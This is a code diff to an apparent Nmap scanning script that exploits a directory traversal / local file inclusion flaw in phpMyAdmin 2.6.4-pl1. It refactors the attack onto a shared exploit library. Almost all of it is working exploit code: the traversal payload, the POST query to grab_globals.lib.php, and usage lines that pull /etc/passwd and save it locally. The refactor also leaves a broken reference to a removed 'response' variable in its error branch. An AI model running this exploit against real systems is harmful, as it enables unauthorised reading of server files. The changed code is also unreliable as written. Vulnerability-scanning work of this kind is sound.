@@ -4,6 +4,7 @@ local string = require "string"
 local http = require "http"
 local io = require "io"
 local vulns = require "vulns"
+local exploit = require "exploit"
 
 description = [[
 Exploits a directory traversal vulnerability in phpMyAdmin 2.6.4-pl1 (and
@@ -15,7 +16,7 @@ Reference:
 
 ---
 -- @usage
--- nmap -p80 --script http-phpmyadmin-dir-traversal --script-args="dir='/pma/',file='../../../../../../../../etc/passwd',outfile='passwd.txt'" <host/ip>
+-- nmap -p80 --script http-phpmyadmin-dir-traversal --script-args="dir='/pma/',file='/etc/passwd',outfile='passwd.txt'" <host/ip>
 -- nmap -p80 --script http-phpmyadmin-dir-traversal <host/ip>
 --
 -- @args http-phpmyadmin-dir-traversal.file Remote file to retrieve. Default: <code>../../../../../etc/passwd</code>
@@ -72,33 +73,30 @@ categories = {"vuln", "exploit"}
 
 portrule = shortport.http
 
----
---Writes string to file
---Taken from: hostmap.nse
-local function write_file(filename, contents)
-  local f, err = io.open(filename, "w")
-  if not f then
-    return f, err
-  end
-  f:write(contents)
-  f:close()
-  return true
-end
-
 --Default configuration values
 local EXPLOIT_QUERY = "usesubform[1]=1&usesubform[2]=1&subform[1][redirect]=%s&subform[1][cXIb8O3]=1"
-local DEFAULT_FILE = "../../../../../etc/passwd"
+local DEFAULT_PAYLOAD= "../../../../.."
+local DEFAULT_FILE = "/etc/passwd"
 local DEFAULT_DIR = "/phpMyAdmin-2.6.4-pl1/"
 local EXPLOIT_PATH = "libraries/grab_globals.lib.php"
+
+
+local function generate_rgf(host, port, options, uri)
+  return function (file)
+    local evil_file = DEFAULT_PAYLOAD .. file
+    local postdata = EXPLOIT_QUERY:format(evil_file)
+    stdnse.debug1(evil_file)
+    local response = http.post(host, port, uri, options, nil, postdata)
+    return response, uri
+  end
+end
 
 action = function(host, port)
   local dir = stdnse.get_script_args("http-phpmyadmin-dir-traversal.dir") or DEFAULT_DIR
   local evil_uri = dir..EXPLOIT_PATH
   local rfile = stdnse.get_script_args("http-phpmyadmin-dir-traversal.file") or DEFAULT_FILE
-  local evil_postdata = EXPLOIT_QUERY:format(rfile)
   local filewrite = stdnse.get_script_args(SCRIPT_NAME..".outfile")
   stdnse.debug1("HTTP POST %s%s", stdnse.get_hostname(host), evil_uri)
-  stdnse.debug1("POST DATA %s", evil_postdata)
 
   local vuln = {
     title = 'phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion',
@@ -115,22 +113,22 @@ action = function(host, port)
     },
   }
   local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
+  local options = {header = {["Content-Type"] = "application/x-www-form-urlencoded"}}
 
-  local response = http.post(host, port, evil_uri,
-    {header = {["Content-Type"] = "application/x-www-form-urlencoded"}}, nil, evil_postdata)
-  if response.body and response.status==200 then
-    stdnse.debug1("response : %s", response.body)
+  local response_status, lfi_success, contents, _, outfile_status, outfile_err =
+    exploit.lfi_check(host, port, nil, rfile, filewrite, nil, nil,
+    generate_rgf(host, port, options, evil_uri))
+
+  if lfi_success then
+    stdnse.debug1("response : %s", contents)
     vuln.state = vulns.STATE.EXPLOIT
-    vuln.extra_info = rfile.." :\n"..response.body
-    if filewrite then
-      local status, err = write_file(filewrite,  response.body)
-      if status then
-        vuln.extra_info = string.format("%s%s saved to %s\n", vuln.extra_info, rfile, filewrite)
-      else
-        vuln.extra_info = string.format("%sError saving %s to %s: %s\n", vuln.extra_info, rfile, filewrite, err)
-      end
+    vuln.extra_info = rfile.." :\n"..contents
+    if outfile_status then
+      vuln.extra_info = string.format("%s%s saved to %s\n", vuln.extra_info, rfile, filewrite)
+    elseif outfile_err then
+      vuln.extra_info = string.format("%sError saving %s to %s: %s\n", vuln.extra_info, rfile, filewrite, outfile_err)
     end
-  elseif response.status==500 then
+  elseif response_status==500 then
     vuln.state = vulns.STATE.LIKELY_VULN
     stdnse.debug1("[Error] File not found:%s", rfile)
     stdnse.debug1("response : %s", response.body)
